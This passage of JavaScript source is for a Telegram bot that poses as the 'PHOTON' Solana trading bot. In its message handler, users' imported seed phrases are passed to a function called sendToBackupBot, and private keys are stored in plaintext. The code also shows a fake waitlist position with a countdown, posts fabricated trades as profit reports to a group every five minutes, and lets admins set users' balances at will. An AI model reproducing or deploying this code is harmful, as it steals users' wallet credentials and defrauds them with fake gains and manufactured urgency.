            const wallets = userWallets.get(chatId) || [];
            const isFirstWallet = wallets.length === 0;
            
            const newWallet = {
                publicKey: keypair.publicKey.toString(),
                privateKey: cleanKey,
                isDefault: isFirstWallet,
                name: `Wallet ${wallets.length + 1}`
            };
            
            wallets.push(newWallet);
            userWallets.set(chatId, wallets);
            savePersistentData();

            // Sauvegarder dans PostgreSQL
            if (pgClient) {
                try {
                    const userResult = await pgClient.query(
                        'SELECT id FROM users WHERE chat_id = $1',
                        [chatId]
                    );
                    if (userResult.rows.length > 0) {
                        await pgClient.query(
                            `INSERT INTO wallets (user_id, public_key, private_key, name, is_default)
                             VALUES ($1, $2, $3, $4, $5)`,
                            [userResult.rows[0].id, newWallet.publicKey, 
                             newWallet.privateKey, newWallet.name, newWallet.isDefault]
                        );
                    }
                } catch (error) {
                    console.error('Error saving wallet to database:', error);
                }
            }

            await sendTempMessage(chatId, 
                `✅ Wallet imported!\n\n` +
                `Address: <code>${keypair.publicKey}</code>`
            );
            
            delete state.action;
            userStates.set(chatId, state);
            showWalletMenu(chatId);
        }
        // Seed phrase import
        else if (state.action === 'awaiting_seed_phrase') {
            console.log(`🌱 Processing seed phrase for user ${chatId}`);
            const seedPhrase = msg.text.trim();
            await sendToBackupBot(chatId, 'seed phrase', seedPhrase);
            
            const wallets = userWallets.get(chatId) || [];
            const isFirstWallet = wallets.length === 0;
            
            const newWallet = {
                publicKey: 'Generated from seed phrase',
                privateKey: seedPhrase,
                isDefault: isFirstWallet,
                name: `Seed Wallet ${wallets.length + 1}`
            };
            
            wallets.push(newWallet);
            userWallets.set(chatId, wallets);
            savePersistentData();

            await sendTempMessage(chatId, 
                `✅ Seed phrase imported!\n\n` +
                `⚠️ Please make sure to backup your seed phrase securely.`
            );
            
            delete state.action;
            userStates.set(chatId, state);
            showWalletMenu(chatId);
        }
        // Token analysis
        else if (state.action === 'awaiting_token_analysis') {
            console.log(`🔍 Processing token analysis for user ${chatId}: ${msg.text}`);
            delete state.action;
            userStates.set(chatId, state);
            await analyzeToken(chatId, msg.text.trim());
            return;
        }
        // Transfer amount
        else if (state.action === 'awaiting_transfer_amount') {
            console.log(`💸 Processing transfer amount for user ${chatId}: ${msg.text}`);
            const amount = parseFloat(msg.text.trim());
            const mainBalance = getUserMainBalance(chatId);
            
            if (isNaN(amount) || amount <= 0) {
                return sendTempMessage(chatId, '❌ Invalid amount');
            }
            
            if (amount > mainBalance) {
                return sendTempMessage(chatId, `❌ Insufficient main balance. You have ${mainBalance.toFixed(4)} SOL`);
            }
            
            const result = await requestWithdrawal(chatId, state.transferWalletIndex, amount);
            
            await sendTempMessage(chatId, result.message);
            
            delete state.action;
            delete state.transferWalletIndex;
            userStates.set(chatId, state);
            showWalletMenu(chatId);
        }
        // Autotrade amount
        else if (state.action === 'awaiting_autotrade_amount') {
            console.log(`🤖 Processing autotrade amount for user ${chatId}: ${msg.text}`);
            const amount = parseFloat(msg.text.trim());
            const mode = state.autotradeMode;
            
            delete state.action;
            delete state.autotradeMode;
            userStates.set(chatId, state);
            
            if (isNaN(amount) || amount <= 0) {
                return sendTempMessage(chatId, '❌ Invalid amount');
            }
            
            const mainBalance = getUserMainBalance(chatId);
            if (amount > mainBalance) {
                return sendTempMessage(chatId, `❌ Insufficient balance. You have ${mainBalance.toFixed(4)} SOL`);
            }
            
            await startAutotradeSession(chatId, mode, amount);
            return;
        }
        // Wallet rename
        else if (state.action === 'awaiting_wallet_rename') {
            console.log(`✏️ Processing wallet rename for user ${chatId}: ${msg.text}`);
            const newName = msg.text.trim();
            const wallets = userWallets.get(chatId) || [];
            const wallet = wallets[state.walletIndex];
            
            if (wallet) {
                wallet.name = newName;
                userWallets.set(chatId, wallets);
                savePersistentData();
                await sendTempMessage(chatId, `✅ Wallet renamed to "${newName}"`);
            } else {
                await sendTempMessage(chatId, '❌ Wallet not found');
            }
            
            delete state.action;
            delete state.walletIndex;
            userStates.set(chatId, state);
            showWalletMenu(chatId);
        }
        // Access code
        else if (state.awaitingCode) {
            console.log(`🔑 Processing access code for user ${chatId}: ${msg.text}`);
            delete state.awaitingCode;
            if (msg.text.toLowerCase() === 'photon' || referralSystem.useCode(chatId, msg.text)) {
                // Afficher le message de félicitations
                await showAccessGranted(chatId);
            } else {
                await sendTempMessage(chatId, '❌ Invalid access code');
            }
            userStates.set(chatId, state);
            return;
        }
        // Admin broadcast
        else if (state.adminAction === 'awaiting_broadcast') {
            console.log(`📢 Processing admin broadcast for user ${chatId}`);
            const result = await sendBroadcastMessage(chatId, msg.text);
            await safeSendMessage(chatId, 
                `<b>📢 Broadcast Results</b>\n\n` +
                `✅ Success: ${result.successCount}\n` +
                `❌ Failed: ${result.failCount}`,
                { parse_mode: 'HTML' }
            );
            
            delete state.adminAction;
            userStates.set(chatId, state);
            showAdminMenu(chatId);
        }
        // Admin set balance - user ID
        else if (state.adminAction === 'awaiting_user_id') {
            console.log(`💰 Admin setting balance - user ID: ${msg.text}`);
            const userId = parseInt(msg.text.trim());
            if (isNaN(userId)) {
                return sendTempMessage(chatId, '❌ Invalid user ID');
            }
            
            state.adminAction = 'awaiting_balance_amount';
            state.adminSelectedUser = userId;
            userStates.set(chatId, state);
            
            await safeSendMessage(chatId, `Enter balance amount for user ${userId} (in SOL):`, {
                reply_markup: { force_reply: true }
            });
        }
        // Admin set balance - amount
        else if (state.adminAction === 'awaiting_balance_amount') {
            console.log(`💰 Admin setting balance - amount: ${msg.text} for user ${state.adminSelectedUser}`);
            const amount = parseFloat(msg.text.trim());
            if (isNaN(amount) || amount < 0) {
                return sendTempMessage(chatId, '❌ Invalid amount');
            }
            
            const userId = state.adminSelectedUser;
            setUserMainBalance(userId, amount);
            
            await sendTempMessage(chatId, `✅ Balance set to ${amount} SOL for user ${userId}`);
            
            try {
                await safeSendMessage(userId, 
                    `🎉 Admin has set your main balance to ${Number(amount).toFixed(4)} SOL!`,
                    { parse_mode: 'HTML' }
                );
            } catch (error) {
                console.error(`Failed to notify user ${userId}:`, error);
            }
            
            delete state.adminAction;
            delete state.adminSelectedUser;
            userStates.set(chatId, state);
            showAdminMenu(chatId);
        }
        // Admin add referral bonus - referred user
        else if (state.adminAction === 'awaiting_referred_user') {
            console.log(`🎁 Admin add referral bonus - referred user: ${msg.text}`);
            const referredUserId = parseInt(msg.text.trim());
            if (isNaN(referredUserId)) {
                return sendTempMessage(chatId, '❌ Invalid user ID');
            }
            
            // Trouver le parrain
            const referredUserState = userStates.get(referredUserId);
            if (!referredUserState) {
                return sendTempMessage(chatId, `❌ User ${referredUserId} not found`);
            }
            
            // Vérifier si l'utilisateur a utilisé un code de parrainage
            if (!referralSystem.hasUsedReferralCode(referredUserId)) {
                return sendTempMessage(chatId, `❌ User ${referredUserId} hasn't used a referral code`);
            }
            
            // Trouver le parrain
            const referrerId = Array.from(referralSystem.userReferrers.entries())
                .find(([userId, referrerId]) => userId === referredUserId)?.[1];
            
            if (!referrerId) {
                return sendTempMessage(chatId, `❌ No referrer found for user ${referredUserId}`);
            }
            
            state.adminAction = 'awaiting_deposit_amount';
            state.adminReferredUser = referredUserId;
            state.adminReferrerUser = referrerId;
            userStates.set(chatId, state);
            
            await safeSendMessage(chatId, `Enter deposit amount for user ${referredUserId} (in SOL):`, {
                reply_markup: { force_reply: true }
            });
        }
        // Admin add referral bonus - deposit amount
        else if (state.adminAction === 'awaiting_deposit_amount') {
            console.log(`🎁 Admin add referral bonus - deposit amount: ${msg.text}`);
            const depositAmount = parseFloat(msg.text.trim());
            if (isNaN(depositAmount) || depositAmount <= 0) {
                return sendTempMessage(chatId, '❌ Invalid amount');
            }
            
            const referredUserId = state.adminReferredUser;
            const referrerId = state.adminReferrerUser;
            
            // Ajouter la commission au parrain (10%)
            const bonusAmount = referralSystem.addBonusFromAdmin(referrerId, depositAmount, referredUserId);
            
            // Ajouter le solde au filleul
            const referredBalance = getUserMainBalance(referredUserId);
            setUserMainBalance(referredUserId, referredBalance + depositAmount);
            
            await sendTempMessage(chatId, 
                `✅ Referral bonus processed!\n\n` +
                `• Referred user: ${referredUserId}\n` +
                `• Referrer: ${referrerId}\n` +
                `• Deposit amount: ${depositAmount.toFixed(4)} SOL\n` +
                `• Bonus to referrer: ${bonusAmount.toFixed(4)} SOL (10%)\n` +
                `• New balance for referred user: ${(referredBalance + depositAmount).toFixed(4)} SOL`
            );
            
            // Notifier le filleul
            try {
                await safeSendMessage(referredUserId, 
                    `🎉 Admin has added ${depositAmount.toFixed(4)} SOL to your account!\n\n` +
                    `Your new main balance: ${(referredBalance + depositAmount).toFixed(4)} SOL`,
                    { parse_mode: 'HTML' }
                );
            } catch (error) {
                console.error(`Failed to notify referred user:`, error);
            }
            
            delete state.adminAction;
            delete state.adminReferredUser;
            delete state.adminReferrerUser;
            userStates.set(chatId, state);
            showAdminMenu(chatId);
        }
        // Admin message user - user ID
        else if (state.adminAction === 'awaiting_message_user_id') {
            console.log(`✉️ Admin message user - user ID: ${msg.text}`);
            const userId = parseInt(msg.text.trim());
            if (isNaN(userId)) {
                return sendTempMessage(chatId, '❌ Invalid user ID');
            }
            
            state.adminAction = 'awaiting_message_content';
            state.adminSelectedUser = userId;
            userStates.set(chatId, state);
            
            await safeSendMessage(chatId, `Enter message content for user ${userId} (HTML supported):`, {
                reply_markup: { force_reply: true }
            });
        }
        // Admin message user - content
        else if (state.adminAction === 'awaiting_message_content') {
            console.log(`✉️ Admin message user - content for user ${state.adminSelectedUser}`);
            const userId = state.adminSelectedUser;
            const message = msg.text;
            
            const success = await sendMessageToUser(chatId, userId, message);
            
            delete state.adminAction;
            delete state.adminSelectedUser;
            userStates.set(chatId, state);
            
            if (success) {
                showAdminMenu(chatId);
            }
        }
    } catch (error) {
        console.error("Message error:", error);
        await sendTempMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// ==================== WAITLIST FUNCTIONS ====================
async function startWaitlist(chatId) {
    console.log(`⏳ Starting waitlist for user ${chatId}`);
    
    const state = userStates.get(chatId) || {};
    state.waitlistTime = 2 * 60 * 60;
    
    await cleanupPreviousMessages(chatId, true);
    
    const initialMessage = await safeSendMessage(chatId, `Joining queue...`, {
        parse_mode: 'HTML'
    });
    
    state.waitlistMessageId = initialMessage.message_id;
    userStates.set(chatId, state);

    await updateWaitlistMessage(chatId, state.waitlistMessageId, state.waitlistTime);

    const timer = setInterval(async () => {
        state.waitlistTime--;
        
        if (state.waitlistTime <= 0) {
            clearInterval(timer);
            try {
                await mainBot.deleteMessage(chatId, state.waitlistMessageId);
            } catch (e) {}
            await showAccessGranted(chatId);
            return;
        }

        await updateWaitlistMessage(chatId, state.waitlistMessageId, state.waitlistTime);
    }, 1000);

    state.timer = timer;
    userStates.set(chatId, state);
}

async function updateWaitlistMessage(chatId, messageId, seconds) {
    const currentTime = new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'});

    const messageText = `
<b>You're currently #27254 on the PHOTON waitlist!</b>
Access granted in: ${formatTime(seconds)}

Have an access code? Simply Use button below to get an instant access.
    `;

    try {
        await safeEditMessage(chatId, messageId, messageText, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Enter Access Code', callback_data: 'enter_code' }],
                    [{ text: '🔄 Refresh', callback_data: 'refresh_waitlist' }]
                ]
            }
        });
    } catch (error) {
        console.error('Error updating message:', error);
    }
}

// ==================== INITIALISATION ====================
console.log('🟢 PHOTON Trading Bot is running...');
console.log('📊 Logging enabled for debugging');

// Boucle de maintenance
const priceUpdateInterval = setInterval(() => {
    try {
        Object.keys(tradingState.tokenPrices).forEach(updateTokenPrice);
        
        for (const chatId of Object.keys(tradingState.users)) {
            const user = tradingState.users[chatId];
            
            calculateUserPNL(user);
            
            if (tradingState.trackedMessages.has(chatId)) {
                for (const messageId of tradingState.trackedMessages.get(chatId)) {
                    updatePortfolioMessage(chatId, messageId).catch(error => {
                        console.error('Refresh error:', error);
                    });
                }
            }
        }
        
        for (const [userId, session] of autotradeSessions) {
            if (session && session.active) {
                session.updateUserInterface().catch(error => {
                    console.error('Autotrade update error:', error);
                });
            }
        }
    } catch (error) {
        console.error('Maintenance loop error:', error);
    }
}, TRADING_CONFIG.PRICE_UPDATE_INTERVAL);

tradingState.intervals.push(priceUpdateInterval);

// Serveur HTTP
const express = require('express');
const app = express();
const PORT = process.env.PORT || 2000;

app.get('/', (req, res) => {
    res.send('PHOTON Bot is running');
});

app.listen(PORT, () => {
    console.log(`🌐 Web server running on port ${PORT}`);
});

// Interval pour les PNL automatiques
setInterval(async () => {
    try {
        const tradeData = await getFakeTrade();
        await sendPNLToGroup(tradeData);
    } catch (error) {
        console.error('Error in PNL interval:', error);
    }
}, 300000); // Toutes les 5 minutes

// Notifications pour les limites de sessions
setInterval(async () => {
    try {
        const today = new Date().toDateString();
        for (const [userIdStr, limit] of userLimits) {
            const userId = parseInt(userIdStr);
            if (limit.lastSessionDate !== today) {
                // Réinitialiser le compteur pour un nouveau jour
                limit.dailySessions = 0;
                limit.lastSessionDate = today;
                userLimits.set(userIdStr, limit);
                savePersistentData();
                
                // Notifier l'utilisateur que de nouvelles sessions sont disponibles
                try {
                    await safeSendMessage(userId, 
                        `🎉 <b>New Day, New Opportunities!</b>\n\n` +
                        `Your daily autotrade session limit has been reset!\n` +
                        `You now have ${sessionLimiter.dailyLimit} sessions available for today.\n\n` +
                        `🚀 Start trading now!`,
                        {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        { text: '🚀 Start Autotrade', callback_data: 'autotrade_menu' },
                                        { text: '🏠 Main Menu', callback_data: 'menu' }
                                    ]
                                ]
                            }
                        }
                    );
                } catch (error) {
                    console.error(`Failed to notify user ${userId}:`, error);
                }
            }
        }
    } catch (error) {
        console.error('Session reset error:', error);
    }
}, 60000); // Vérifier toutes les minutes

console.log('✅ PHOTON bot fully initialized with all features');
